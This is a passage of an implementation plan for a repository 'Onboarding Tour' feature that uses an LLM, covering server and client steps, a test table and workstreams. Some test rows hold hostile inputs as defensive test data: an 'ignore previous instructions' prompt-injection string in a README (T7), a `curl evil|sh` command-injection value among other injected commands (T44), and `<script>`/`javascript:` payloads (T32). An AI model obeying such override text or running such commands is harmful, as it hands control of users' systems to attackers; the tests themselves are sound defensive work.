      3. Flag off → 409 `repo_intel_disabled` (AC-29).
      4. A running generation exists → return it with `created:false` (AC-34).
      5. `isIndexing` → 409 `indexing_in_progress` (AC-28).
      6. Within the cooldown → 429 `onboarding_cooldown` with `{ retryAfterSeconds }` (AC-40).
      7. `no_data` → phase `indexing`, `requestIndexBuild`, chain `done` → enqueue `GENERATE_JOB_KIND`, `done` rejected → `finish(failed,'index_failed')`, with `.catch(log)` (AC-46).
      8. Otherwise → phase `generating` and enqueue (AC-47).
      9. A `null` insert → `getRunning` (AC-34).
- Change: application ring; no Fastify or Drizzle in the service.
- Acceptance: no `drizzle-orm` import in the service; typechecks.
- Tested by: T10, T11, T14, T15, T16, T17, T18, T19, T36, T37, T39, T40
- ACs: SPEC-02/AC-11, SPEC-02/AC-26, SPEC-02/AC-27, SPEC-02/AC-28, SPEC-02/AC-29, SPEC-02/AC-31, SPEC-02/AC-33, SPEC-02/AC-34, SPEC-02/AC-36, SPEC-02/AC-37, SPEC-02/AC-38, SPEC-02/AC-40, SPEC-02/AC-46, SPEC-02/AC-47
- Covers: RQ11, RQ26, RQ27, RQ28, RQ29, RQ31, RQ33, RQ34, RQ36, RQ37, RQ38, RQ40, RQ45, RQ46
- Depends on: S2, S3, S4

### S6 — Generation job (one logical call, grounding, persistence, records)   [module: server] [skills: onion-architecture, zod, typescript-expert] [workstream: W1]
- Files:
  - create `server/src/modules/onboarding/generation.ts` — `runGeneration(deps: { container, repository, log: PinoLike }, generationId, opts: { timeoutMs?: number } = {})`. `timeoutMs` defaults to `LLM_TIMEOUT_MS`. It never throws.
    1. `setPhase('generating')`.
    2. Load facts and index state; a failed or `no_data` index → `finish(failed,'index_failed')`.
    3. Build the skeleton; `resolveFeatureModel(…, 'onboarding')`.
    4. Exactly one `llm.completeStructured({ model, schema: OnboardingModelOutput, schemaName, messages, temperature: 0.2, maxRetries: 0, timeoutMs })`. The adapter applies `timeoutMs` per attempt (`openai.ts:97-99`); the outer `withTimeout(…, timeoutMs)` bounds the total including transport retries. The outer timeout does not cancel the in-flight HTTP call (Risks) (AC-19, AC-23, review M5).
    5. Error mapping:
       - `ExternalServiceError` with `details.raw` → `ai_output_invalid`, tokens null (AC-22)
       - a merged-result `OnboardingTour.safeParse` failure → `ai_output_invalid`
       - other errors or `TimeoutError` → `ai_unavailable`, tokens null (AC-23, AC-44)
    6. Success: `groundModelOutput` → `mergeGenerated(…, new Date().toISOString())` → `OnboardingTour.parse` → `upsertTour` → `finish(succeeded, { model, tokensIn, tokensOut, durationMs })` (AC-14, AC-16, AC-33, AC-51, AC-56).
    7. Failure: `t.onboarding` untouched (AC-35); `finish(failed, { reason, durationMs })`.
    8. One `log.info` from the allowlist `{ generationId, repoId, status, reason, durationMs, tokensIn, tokensOut, model }`; never `details` or `raw` (AC-44).
  - modify `server/src/modules/onboarding/service.ts` — `registerJobHandlers(log: PinoLike)`:
    - capture `bootTime = new Date()`
    - `repository.failStaleRunning(bootTime)`: only rows started before this app booted (review m8)
    - `container.jobs.register(GENERATE_JOB_KIND, (p) => runGeneration({ container, repository, log }, p.generationId))`
- Acceptance: with a stub, one success persists one `onboarding` row and one `succeeded` row with tokens; the stub sees exactly one call with `maxRetries: 0`.
- Tested by: T11, T12, T13, T16, T20
- ACs: SPEC-02/AC-14, SPEC-02/AC-16, SPEC-02/AC-19, SPEC-02/AC-22, SPEC-02/AC-23, SPEC-02/AC-33, SPEC-02/AC-35, SPEC-02/AC-44, SPEC-02/AC-51, SPEC-02/AC-56
- Covers: RQ14, RQ16, RQ19, RQ22, RQ23, RQ33, RQ35, RQ43, RQ50, RQ55
- Depends on: S5

### S7 — Routes and module registration   [module: server] [skills: fastify-best-practices, onion-architecture, zod] [workstream: W1]
- Files:
  - create `server/src/modules/onboarding/routes.ts` — following `server/src/modules/repo-intel/routes.ts:13-60`. On boot it calls `service.registerJobHandlers(app.log)`.
    - `GET /repos/:id/onboarding` → 200 `OnboardingTourState` (response schema) (AC-36, AC-38)
    - `POST /repos/:id/onboarding/generate` → 202 when created, 200 with the running generation otherwise (AC-34); errors 404 / 409 (`repo_intel_disabled`, `indexing_in_progress`) / 422 / 429 (`details.retryAfterSeconds`)
  - modify `server/src/modules/index.ts` — register `onboarding`
- Change: transport only.
- Acceptance: GET on a seeded repo → 200 `tour: null`; a foreign repo → 404.
- Tested by: T10, T14, T15, T16, T37
- ACs: SPEC-02/AC-28, SPEC-02/AC-34, SPEC-02/AC-36, SPEC-02/AC-38, SPEC-02/AC-39, SPEC-02/AC-40
- Covers: RQ28, RQ34, RQ36, RQ38, RQ39, RQ40
- Depends on: S5, S6

### S8 — Sidebar nav entry and active-key fix   [module: client] [skills: next-best-practices, frontend-architecture] [workstream: W2]
- Files:
  - modify `client/src/vendor/ui/nav.ts` — insert `{ key: "onboarding-tour", label: "Onboarding Tour", icon: <existing IconName>, href: "/repos/:repoId/onboarding-tour" }` between `pulls` and `context` (lines 25-26)
  - modify `client/src/components/app-shell/helpers.ts` — line 29 → `pathname.includes("/onboarding-tour") → "onboarding-tour"`
- Acceptance: `activeKeyFor("/onboarding") === ""`; `/repos/x/onboarding-tour` → `onboarding-tour`; `/repos/x/context` → `context`.
- Tested by: T21, T22
- ACs: SPEC-02/AC-1, SPEC-02/AC-2, SPEC-02/AC-3
- Covers: RQ1, RQ2, RQ3
- Depends on: —

### S9 — Copy for the tour (`onboarding` namespace)   [module: client] [skills: frontend-architecture] [workstream: W2]
- Files:
  - modify `client/messages/en/onboarding.json` — rewrite (the namespace is unused today)
- Change: keys for:
  - `title`, `heading` ("Onboarding for {repoName}"), `selectRepo` ("Select a repository")
  - `subline` ("Generated from index of {n} files · last refreshed {time}"), `sublinePartial` ("Generated from index of {n} of {m} files · last refreshed {time}")
  - `sublineSkeleton` ("Generated from index of {n} files"), `sublineSkeletonPartial` ("Generated from index of {n} of {m} files") — skeleton: index facts only, no "last refreshed" (review M6)
  - `partialNotice`, `onThisPage`, `sections.*`
  - `empty.title` ("Generate onboarding tour"), `empty.body` (exact AC-39 text), `empty.cta` ("Generate onboarding tour"; the plus is the icon), `crumbWorkspace` ("Workspace")
  - `regenerate`, `retry`, `reanalyze`, `elapsed`, `stale` ("The index changed since this tour was generated")
  - `reasons.{flag_off:"Repository index is turned off", ai_output_invalid:"AI output invalid", ai_unavailable:"AI summary unavailable", index_failed, no_data, interrupted}`
  - `notCloned` ("Repository not cloned yet"), `indexing` ("Indexing in progress"), `noSupportedFiles` ("No supported source files indexed (.ts, .tsx, .js, .jsx, .mjs, .cjs)"), `noRunInstructions` ("No run instructions found in this repo")
  - `firstTasksPending` ("Available once the AI summary is generated")
  - `factImporters` ("imported by {count} files"), `factEndpoints`
  - `complexity` ("{level} complexity") + `complexityLevel.{low,medium,high}`
  - `showAll` ("Show all ({count})"), `showLess`, `truncationNote` ("Top 25 of {total} indexed files by import rank")
  - `open`, `copy`, `copied` ("Copied"), `announce.{succeeded,failed}`, `toggleSection`
  - `errors.{cooldown:"Try again in {seconds}s", indexingInProgress, repoIntelDisabled, notCloned, generic}`
- Acceptance: valid JSON; every visible string of S10–S13 resolves from it.
- Tested by: T23–T34, T38
- ACs: SPEC-02/AC-4, SPEC-02/AC-5, SPEC-02/AC-6, SPEC-02/AC-7, SPEC-02/AC-17, SPEC-02/AC-18, SPEC-02/AC-26, SPEC-02/AC-27, SPEC-02/AC-28, SPEC-02/AC-29, SPEC-02/AC-31, SPEC-02/AC-37, SPEC-02/AC-39, SPEC-02/AC-40, SPEC-02/AC-53, SPEC-02/AC-58
- Covers: RQ4, RQ5, RQ6, RQ7, RQ17, RQ18, RQ26, RQ27, RQ28, RQ29, RQ31, RQ37, RQ39, RQ40, RQ52, RQ57
- Depends on: —

### S10 — Data hooks for the tour   [module: client] [skills: react-best-practices, frontend-architecture] [workstream: W2]
- Files:
  - create `client/src/lib/hooks/onboarding.ts`:
    - `useOnboardingTour(repoId, { poll })`: `refetchInterval: poll ? 5000 : false` (AC-28, AC-32)
    - `useGenerateOnboardingTour(repoId)`: POST, then invalidate; exposes `ApiError` (code, status, details)
  - modify `client/src/lib/hooks/index.ts` — add `export * from "./onboarding";`
- Change: follows `client/src/lib/hooks/repo-intel.ts:31-50`. Re-analyze reuses `useResyncRepoIntel` (`repo-intel.ts:41`) and also invalidates the tour query.
- Acceptance: typechecks; no value import from `@devdigest/shared`.
- Tested by: T25, T27, T28, T38
- ACs: SPEC-02/AC-28, SPEC-02/AC-30, SPEC-02/AC-32, SPEC-02/AC-33, SPEC-02/AC-39, SPEC-02/AC-47
- Covers: RQ28, RQ30, RQ32, RQ33, RQ39, RQ46
- Depends on: S1

### S11 — Tour route, header, empty, status and error states   [module: client] [skills: next-best-practices, react-best-practices, frontend-architecture] [workstream: W2]
- Files:
  - create `client/src/app/repos/[repoId]/onboarding-tour/page.tsx` — a thin `"use client"` entry
  - create `.../onboarding-tour/_components/OnboardingTourView/{OnboardingTourView.tsx,index.ts,constants.ts,helpers.ts,styles.ts}`:
    - `repoId === "_"` (`client/src/vendor/ui/nav.ts:73`) → `selectRepo` (AC-4)
    - `useRepoNotFound`; the repo comes from `useRepos()`
    - `AppShell crumb=[{label: t("crumbWorkspace")}, {label: t("title")}]` (same pattern as Project Context / Pull Requests), with no Share control (AC-49)
    - `constants.ts` restates `SECTION_ORDER` and `VISIBLE_ENTRIES = 8`
    - `helpers.ts`:
      - `pickView(state)`:
        - not cloned (AC-27)
        - indexing (AC-28, AC-46)
        - flag off → skeleton (AC-29)
        - no tour and no generation → empty (AC-39)
        - no tour and running → skeleton placeholder (AC-32, first generation)
        - no tour and failed → skeleton plus reason plus Retry (AC-22, AC-23, AC-26)
        - index failed → skeleton plus Re-analyze (AC-30)
        - tour and failed → generated plus failure banner (AC-35)
        - tour and running → generated, Regenerate aria-disabled (AC-33)
        - stale → notice plus Regenerate plus Re-analyze (AC-37, AC-47)
      - `generateErrorMessage(err)`: 429 → `errors.cooldown` with `retryAfterSeconds` (AC-40); 409 `indexing_in_progress` → message plus refetch; 409 `repo_intel_disabled` / 422 / other → their keys; shown in a `role="alert"`
  - create `.../_components/TourHeader/{TourHeader.tsx,index.ts,styles.ts}`:
    - heading with the repo name in `mono` + `var(--accent)` (AC-5)
    - generated: `subline` / `sublinePartial` with `relativeTime(generatedAt)` and an absolute `title` (AC-6, AC-7)
    - skeleton (`generatedAt === null`): `sublineSkeleton` / `sublineSkeletonPartial`, with no time (review M6)
    - partial when `status==='partial' || filesSkipped>0`, with m = indexed + skipped, plus `partialNotice` (AC-7)
    - Regenerate (`aria-disabled` while running, elapsed seconds via a 1 s interval effect) (AC-32)
    - `role="status"` announcements (AC-45)
    - **Focus rule (review m10):** a ref on Regenerate. When the view changes from `empty` to another view, focus moves to Regenerate in an effect keyed on the view; otherwise focus is left alone (AC-45).
  - create `.../_components/TourEmptyState/{…}` — icon tile, title, body, one CTA; no request before the click (AC-39)
  - create `.../_components/TourBanner/{…}` — reason/error banner with Retry / Re-analyze / Regenerate
- Acceptance: each `pickView` branch renders its copy; no Tailwind utilities; `import type` only.
- Tested by: T23, T24, T25, T26, T27, T28, T38
- ACs: SPEC-02/AC-4, SPEC-02/AC-5, SPEC-02/AC-6, SPEC-02/AC-7, SPEC-02/AC-22, SPEC-02/AC-23, SPEC-02/AC-26, SPEC-02/AC-27, SPEC-02/AC-28, SPEC-02/AC-29, SPEC-02/AC-30, SPEC-02/AC-32, SPEC-02/AC-33, SPEC-02/AC-35, SPEC-02/AC-37, SPEC-02/AC-39, SPEC-02/AC-40, SPEC-02/AC-45, SPEC-02/AC-46, SPEC-02/AC-47, SPEC-02/AC-49
- Covers: RQ4, RQ5, RQ6, RQ7, RQ22, RQ23, RQ26, RQ27, RQ28, RQ29, RQ30, RQ32, RQ33, RQ35, RQ37, RQ39, RQ40, RQ44, RQ45, RQ46, RQ48
- Depends on: S9, S10

### S12 — Sections frame: collapsible cards, TOC, anchors   [module: client] [skills: react-best-practices, frontend-architecture, next-best-practices] [workstream: W2]
- Files:
  - create `.../_components/TourSection/{TourSection.tsx,index.ts,styles.ts}` — `id={sectionKey}`; chevron button with `aria-expanded`, `aria-controls` and `aria-label`; expanded by default (AC-10)
  - create `.../_components/TourToc/{TourToc.tsx,index.ts,styles.ts}` — buttons in `SECTION_ORDER`; click or Enter expands and calls `scrollIntoView` (AC-50); `aria-current` (AC-9)
  - create `.../_components/OnboardingTourView/hooks/useActiveSection.ts` — `IntersectionObserver` (AC-9)
  - create `.../_components/OnboardingTourView/hooks/useSectionAnchor.ts` — hash → expand and scroll (AC-48)
  - modify `.../_components/OnboardingTourView/OnboardingTourView.tsx` — five `TourSection`s in order in both modes (AC-8); owns the expanded set
- Acceptance: five headings in order; the chevron toggles `aria-expanded`.
- Tested by: T29, T30
- ACs: SPEC-02/AC-8, SPEC-02/AC-9, SPEC-02/AC-10, SPEC-02/AC-48, SPEC-02/AC-50
- Covers: RQ8, RQ9, RQ10, RQ47, RQ49
- Depends on: S11

### S13 — Section bodies: ranked lists, commands, first tasks, safe Markdown   [module: client] [skills: react-best-practices, frontend-architecture] [workstream: W2]
- Files:
  - create `.../_components/ArchitectureBody/{…}`:
    - stack and dirs
    - `summary` via `<Markdown skipHtml>` (AC-24)
    - `<MermaidDiagram chart>`, null when invalid (AC-25)
    - no diagram in the skeleton (AC-26)
  - create `.../_components/RankedList/{RankedList.tsx,index.ts,helpers.ts,styles.ts}`:
    - 8 rows plus a toggle only when there are more than 8 (AC-53, AC-54, AC-55, AC-57)
    - path truncated with `title`
    - fact line from `importers`/`endpoints` (AC-16, AC-56)
    - `reason` as plain text
    - "Open" `<a target="_blank" rel="noopener noreferrer" href={githubBlobUrl(full_name, indexedSha, path)}>`, rendered **only when `indexedSha !== ''`** (AC-42, review M6)
    - `truncationNote` when expanded and `truncated`, with `total = index.filesIndexed` (AC-58)
    - used for both lists (AC-13)
  - create `.../_components/CommandList/{CommandList.tsx,index.ts,helpers.ts,styles.ts}`:
    - commands and env names; empty → `noRunInstructions` (AC-18)
    - copy via `stripTrailingComment`, with "Copied" in `role="status"` (AC-43)
    - shown for `no_supported_files` (AC-31)
  - create `.../_components/FirstTasks/{…}` — badge `t("complexity", { level })` (AC-17); no Open button, no handler (AC-52); `null` → `firstTasksPending` (AC-26)
  - modify `.../_components/OnboardingTourView/OnboardingTourView.tsx` — wire the bodies; `no_supported_files` → ranked sections show `noSupportedFiles` (AC-31)
- Acceptance: `<script>` / `javascript:` in the summary produce no script element or `javascript:` href.
- Tested by: T31, T32, T33, T34
- ACs: SPEC-02/AC-13, SPEC-02/AC-16, SPEC-02/AC-17, SPEC-02/AC-18, SPEC-02/AC-24, SPEC-02/AC-25, SPEC-02/AC-26, SPEC-02/AC-31, SPEC-02/AC-42, SPEC-02/AC-43, SPEC-02/AC-52, SPEC-02/AC-53, SPEC-02/AC-54, SPEC-02/AC-55, SPEC-02/AC-56, SPEC-02/AC-57, SPEC-02/AC-58
- Covers: RQ13, RQ16, RQ17, RQ18, RQ24, RQ25, RQ26, RQ31, RQ41, RQ42, RQ51, RQ52, RQ53, RQ54, RQ55, RQ56, RQ57
- Depends on: S12

## Tests
`test-writer` writes these after the implementation; the implementer writes no tests. Each test name starts with the id in `Proves`. The kind is never lower than the AC's `verify:` level. Each scenario is behaviour only. Integration files build **one app per file** (`beforeAll`), so the boot-time `failStaleRunning(bootTime)` cannot fail another file's rows (review m8).

| ID | Proves | Kind | File | Scenario | Package |
|---|---|---|---|---|---|
| T1 | SPEC-02/AC-8, SPEC-02/AC-13 | unit | `server/test/contracts.test.ts` (update) | `OnboardingTour.parse` accepts a skeleton (`firstTasks: null`, `generatedAt: null`) and a generated tour; rejects 26 entries and 4 tasks | server |
| T2 | SPEC-02/AC-12 | unit | `server/test/onboarding-helpers.test.ts` (new) | All hotness 0 → PageRank order; hotness set → `pagerank*(1+hotness)` order | server |
| T3 | SPEC-02/AC-13, SPEC-02/AC-58 | unit | `server/test/onboarding-helpers.test.ts` (new) | 60 ranked files with importers → 25 critical (beyond the 15 chain files), 25 reading, `truncated: true`; 18 → `false`; exactly 25 candidates → `false`; 3 model tasks with 1 ungrounded → 2 | server |
| T4 | SPEC-02/AC-15, SPEC-02/AC-18 | unit | `server/test/onboarding-helpers.test.ts` (new) | `npm run fake` without script → dropped; `npm run dev` with script → kept; no run files → `[]` | server |
| T5 | SPEC-02/AC-16, SPEC-02/AC-56 | unit | `server/test/onboarding-helpers.test.ts` (new) | 25 entries, reasons for 10 → 1–8 reasons, 9–25 null; reason "used by 14 routes" → dropped; reason "Wires OAuth2 v1 over http/2" → kept; importers/endpoints equal facts | server |
| T6 | SPEC-02/AC-17 | unit | `server/test/onboarding-helpers.test.ts` (new) | importers 2/7/15 → low/medium/high; directory `specs/` with 40 importers → low | server |
| T7 | SPEC-02/AC-20, SPEC-02/AC-21 | unit | `server/test/onboarding-prompt.test.ts` (new) | 20,000-char README with "ignore previous instructions" → inside `<untrusted>`, ≤4,000 chars; `API_KEY=secret` → name only; exactly 8 paths per list offered | server |
| T8 | SPEC-02/AC-26, SPEC-02/AC-31, SPEC-02/AC-57 | unit | `server/test/onboarding-helpers.test.ts` (new) | `buildSkeleton` 25 files, reason `ai_unavailable` → skeleton, `generatedAt: null`, no diagram, reasons null, `firstTasks: null`; `filesIndexed: 0` with scripts → `no_supported_files`, commands present | server |
| T9 | SPEC-02/AC-14, SPEC-02/AC-28 | it (Testcontainers) | `server/test/repo-intel-tour-facts.it.test.ts` (new) | Seeded rank/edges → importer counts match; empty `file_rank` plus `symbols` → `indexedPaths` = symbol paths; `jobs` row kind `repo-intel-index`, payload repoId: `queued` with `scheduled_at = now()` → `isIndexing` true; `running` with `started_at = now() - 8 min` → false; `done` → false | server |
| T10 | SPEC-02/AC-36 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | GET and POST on another workspace's repo (real seeded users) → 404 | server |
| T11 | SPEC-02/AC-11, SPEC-02/AC-19, SPEC-02/AC-38 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Temp checkout plus fake repoIntel, throwing stub → GET skeleton with stack, endpoints, scripts, 0 calls; ok stub → 1 `completeStructured` call with `maxRetries: 0` and `timeoutMs`; GET twice → same tour, still 1 call | server |
| T12 | SPEC-02/AC-14, SPEC-02/AC-51 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Stub reason for `src/ghost.ts`, 4 tasks incl. nonexistent path and `specs/` dir → ghost absent, ≤3 tasks, `specs/` kept | server |
| T13 | SPEC-02/AC-22, SPEC-02/AC-23, SPEC-02/AC-44 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Stub throws `ExternalServiceError('…', { raw: '<README text>' })` → `failed`/`ai_output_invalid`, tokens null, GET skeleton with reason; hanging stub plus `runGeneration(…, { timeoutMs: 50 })` → `ai_unavailable`, tokens null; durationMs on all rows, tokens and id on the ok run; fake `PinoLike` lines contain no README text or `raw` | server |
| T14 | SPEC-02/AC-34 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Stub held on a deferred; two POSTs within 1 s → 202 then 200 with the same id; release → 1 call | server |
| T15 | SPEC-02/AC-40 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Seeded finished generation `started_at = now() - 10 s` → POST 429, `details.retryAfterSeconds` ≈ 50 | server |
| T16 | SPEC-02/AC-33, SPEC-02/AC-35 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Tour A; regenerate ok (deferred) → GET A while running, B after; failing regenerate → still A plus latestGeneration failed | server |
| T17 | SPEC-02/AC-46, SPEC-02/AC-47 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Fake repoIntel `no_data` + checkout → POST → `requestIndexBuild` called, GET `indexing: true`, 0 calls until fake `done` resolves, then 1; existing index → no `requestIndexBuild`, 1 call | server |
| T18 | SPEC-02/AC-27, SPEC-02/AC-29 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | `clone_path` null → `cloned: false`, POST 422; nonexistent dir → `cloned: false`; flag off → skeleton `flag_off`, POST 409, 0 calls | server |
| T19 | SPEC-02/AC-31 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | `filesIndexed: 0` plus scripts → skeleton `no_supported_files`, commands present | server |
| T20 | SPEC-02/AC-56 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | 25 entries, stub echoes reasons → 8 offered per list; persisted 9–25 `reason: null` with importer counts | server |
| T21 | SPEC-02/AC-1, SPEC-02/AC-2 | component (RTL) | `client/src/components/app-shell/AppShell.test.tsx` (new) | Repo selected on `/repos/r1/onboarding-tour` → order Pull Requests, Onboarding Tour, Project Context; link `/repos/r1/onboarding-tour`, active | client |
| T22 | SPEC-02/AC-3 | unit | `client/src/components/app-shell/helpers.test.ts` (new) | `/onboarding` → `""`; `/repos/x/onboarding-tour` → `onboarding-tour`; `/repos/x/context` → `context` | client |
| T23 | SPEC-02/AC-4, SPEC-02/AC-5, SPEC-02/AC-49 | component (RTL) | `client/src/app/repos/[repoId]/onboarding-tour/page.test.tsx` (new) | repoId `_` → "Select a repository"; `acme/payments-api` → "Onboarding for payments-api", breadcrumb "Workspace > Onboarding Tour", no "Share link" | client |
| T24 | SPEC-02/AC-6, SPEC-02/AC-7 | component (RTL) | same page test | Generated 4,800 → "Generated from index of 4,800 files · last refreshed …", absolute `title`; partial 5,000 + 7,450 → "5,000 of 12,450 files" plus notice; skeleton (`generatedAt: null`) → "Generated from index of 4,800 files" with no "last refreshed" | client |
| T25 | SPEC-02/AC-39 | component (RTL) | same page test | No tour → title, exact body, one CTA; no POST until click; click → one POST | client |
| T26 | SPEC-02/AC-22, SPEC-02/AC-23, SPEC-02/AC-26, SPEC-02/AC-29, SPEC-02/AC-30 | component (RTL) | same page test | `flag_off` → "Repository index is turned off"; failed index → "Re-analyze" POSTs `/resync`; `ai_unavailable` → "AI summary unavailable" plus Retry; `ai_output_invalid` → "AI output invalid"; first tasks placeholder | client |
| T27 | SPEC-02/AC-27, SPEC-02/AC-28, SPEC-02/AC-46 | component (RTL) | same page test | `cloned:false` → "Repository not cloned yet", no Regenerate; `indexing:true` → "Indexing in progress", refetch after 5 s (fake timers); next not indexing → generate enabled | client |
| T28 | SPEC-02/AC-32, SPEC-02/AC-33, SPEC-02/AC-35, SPEC-02/AC-37, SPEC-02/AC-45, SPEC-02/AC-47 | component (RTL) | same page test | Click empty-state CTA → first generation running → skeleton, Regenerate aria-disabled and focused, elapsed shown; succeeded → sections, status announces, focus still on Regenerate; regenerate with tour → old tour; failed → old tour plus banner; `stale` → notice plus Regenerate plus Re-analyze | client |
| T29 | SPEC-02/AC-8, SPEC-02/AC-10 | component (RTL) | same page test | Five headings in order in both modes; chevrons `aria-expanded="true"`; click → `false`, body hidden | client |
| T30 | SPEC-02/AC-9, SPEC-02/AC-48, SPEC-02/AC-50 | component (RTL) | same page test | Mocked IntersectionObserver → TOC current item; `#critical_paths` → expanded and scrolled; collapsed "First tasks" plus Enter on TOC → expanded, `scrollIntoView` called | client |
| T31 | SPEC-02/AC-13, SPEC-02/AC-16, SPEC-02/AC-53, SPEC-02/AC-54, SPEC-02/AC-55, SPEC-02/AC-57, SPEC-02/AC-58 | component (RTL) | `client/src/app/repos/[repoId]/onboarding-tour/_components/RankedList/RankedList.test.tsx` (new) | 20 → 8 plus "Show all (20)" → 20, "Show less" → 8; 8 → no toggle; 25 truncated, expanded → "Top 25 of 4,800 indexed files by import rank"; not truncated → no note; "imported by 14 files" | client |
| T32 | SPEC-02/AC-24, SPEC-02/AC-25, SPEC-02/AC-42 | component (RTL) | same page test | `<script>` / `javascript:` summary → neither rendered; `mermaid` mocked (`parse` → false) → no diagram, text visible; "Open" href `https://github.com/acme/payments-api/blob/<sha>/<path>`, `_blank`, `noopener`; `indexedSha: ''` → no "Open" | client |
| T33 | SPEC-02/AC-18, SPEC-02/AC-31, SPEC-02/AC-43 | component (RTL) | `.../_components/CommandList/CommandList.test.tsx` (new) | `pnpm dev # http://localhost:3000` → clipboard `pnpm dev`, "Copied"; none → "No run instructions found in this repo"; `no_supported_files` → notice plus commands | client |
| T34 | SPEC-02/AC-17, SPEC-02/AC-52 | component (RTL) | `.../_components/FirstTasks/FirstTasks.test.tsx` (new) | "Low complexity", "Medium complexity", "High complexity"; no "Open"; clicking a card changes nothing | client |
| T35 | SPEC-02/AC-14, SPEC-02/AC-15 | unit | `server/test/onboarding-helpers.test.ts` (new) | Summary with `` `src/ghost.ts` `` → null; diagram node `redis/cache.ts` unindexed → null; grounded summary mentioning `README.md` → kept; model `runCommands` never exceed `deriveCommands` | server |
| T36 | SPEC-02/AC-38 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Old-shape `{ sections: [...] }` JSON in `onboarding` → GET 200, `tour: null`, 0 calls | server |
| T37 | SPEC-02/AC-28, SPEC-02/AC-46 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Real repoIntel with a seeded `queued` index `jobs` row (`scheduled_at = now()`) → GET `indexing: true`, POST 409 `indexing_in_progress`, no new index row; the same row with `scheduled_at = now() - 8 min` → `indexing: false` | server |
| T38 | SPEC-02/AC-40 | component (RTL) | same page test | POST answered 429 `{ code:'onboarding_cooldown', details:{ retryAfterSeconds: 42 } }` → alert "Try again in 42s" | client |
| T39 | SPEC-02/AC-37 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Tour generated at sha `abc`; index state touched (updated_at later, same sha) → `stale: false`; `last_indexed_sha` → `def` → `stale: true` | server |
| T40 | SPEC-02/AC-34 | it (Testcontainers) | `server/test/onboarding.it.test.ts` (new) | Seeded `running` row with `started_at = now() - 10 min` (orphan) → GET latestGeneration `failed`/`interrupted`; POST → 202 with a new generation id | server |
| T41 | RQ58 | unit + it | `server/test/onboarding-redaction.test.ts`, `server/test/onboarding.it.test.ts` | Compose/package/README secrets redacted, `author:` kept, 4-char echoed secret detected, trivial values ignored; it: a literal compose secret never reaches the model and an echoing summary is dropped | server |
| T42 | RQ59 | unit + component | `server/test/onboarding-redaction.test.ts`, `client/.../ArchitectureBody/ArchitectureBody.test.tsx`, `client/src/test/markdown-primitive.test.tsx` | Summary with image/link/bare URL → stripped server-side; rendered summary has no `<a>`/`<img>`, link text kept; Markdown primitive still renders links by default | server, client |
| T43 | RQ60 | it (Testcontainers) | `server/test/repo-intel-tour-facts.it.test.ts`, `server/test/onboarding.it.test.ts` | Queued job now → indexing; running job 8 min old → not indexing; another repo's job → not indexing | server |
| T44 | RQ61 | unit | `server/test/onboarding-helpers.test.ts` | Scripts `dev`, `test:e2e`, `lint-fix` → offered; `dev; curl evil\|sh`, `build\ncurl x`, `a && b`, `$(x)` → not offered; model command naming a skipped script is dropped | server |
| T45 | RQ62, SPEC-02/AC-45 | component (RTL) | `client/src/app/repos/[repoId]/onboarding-tour/page.test.tsx` | Existing tour loads → Regenerate does not have focus; empty state → click CTA → Regenerate gets focus; Regenerate focused by the user stays focused after finish/fail | client |

No SPEC-02 AC has `verify: e2e | manual`.

## Execution
| Workstream | Steps | Owns files | Packages | Depends on |
|---|---|---|---|---|
| W0 | S1, S2 | `server/src/vendor/shared/contracts/knowledge.ts`, `client/src/vendor/shared/contracts/knowledge.ts`, `server/src/vendor/shared/index.ts`, `client/src/vendor/shared/index.ts`, `server/src/db/schema/context.ts`, `server/src/db/migrations/0020_*.sql`, `server/src/db/migrations/meta/**` | server, client | — |
| W1 | S4, S3, S5, S6, S7 | `server/src/modules/onboarding/**`, `server/src/modules/_shared/checkout-fs.ts`, `server/src/modules/context/checkout.ts`, `server/src/prompts/onboarding.system.md`, `server/src/modules/repo-intel/constants.ts`, `server/src/modules/repo-intel/index.ts`, `server/src/modules/repo-intel/types.ts`, `server/src/modules/repo-intel/repository.ts`, `server/src/modules/repo-intel/service.ts`, `server/src/modules/index.ts` | server | W0 |
| W2 | S8, S9, S10, S11, S12, S13 | `client/src/vendor/ui/nav.ts`, `client/src/components/app-shell/helpers.ts`, `client/messages/en/onboarding.json`, `client/src/lib/hooks/onboarding.ts`, `client/src/lib/hooks/index.ts`, `client/src/app/repos/[repoId]/onboarding-tour/**` (non-test) | client | W0 |
| TW-server | T1–T20, T35, T36, T37, T39, T40 | `server/test/contracts.test.ts`, `server/test/onboarding-helpers.test.ts`, `server/test/onboarding-prompt.test.ts`, `server/test/onboarding.it.test.ts`, `server/test/repo-intel-tour-facts.it.test.ts` | server | W0, W1, W2 |
| TW-client | T21–T34, T38 | `client/src/components/app-shell/AppShell.test.tsx`, `client/src/components/app-shell/helpers.test.ts`, `client/src/app/repos/[repoId]/onboarding-tour/page.test.tsx`, `client/src/app/repos/[repoId]/onboarding-tour/_components/{RankedList,CommandList,FirstTasks}/*.test.tsx` | client | W0, W1, W2 |

Run order: W0 → (W1 ∥ W2) → check gate → (TW-server ∥ TW-client) → verification. Within W1, run S4 before S3.

## Contracts & DB
- Contracts: in `contracts/knowledge.ts`, delete `OnboardingLink`/`OnboardingSection`/`Onboarding` and add `OnboardingSectionKey`, `OnboardingReason`, `OnboardingRankedEntry`, `OnboardingRankedList`, `OnboardingCommand`, `OnboardingFirstTask`, `OnboardingTour` (with `generatedAt` nullable), `OnboardingGeneration`, `OnboardingTourState`, `GenerateOnboardingResponse`, in BOTH vendor copies. `OnboardingModelOutput` is server-only.
- DB: a new `onboarding_generations` table, generated and then hand-edited to `IF NOT EXISTS`. The `onboarding` table is unchanged and read with `safeParse`. No `db:migrate` on the shared DB.

## Verification
| Package | Command |
|---|---|
| client | `scripts/check.sh client` |
| server (unit) | `scripts/check.sh server` |
| server (integration) | `scripts/check.sh server --it --no-typecheck` |
| mcp | `scripts/check.sh mcp` |
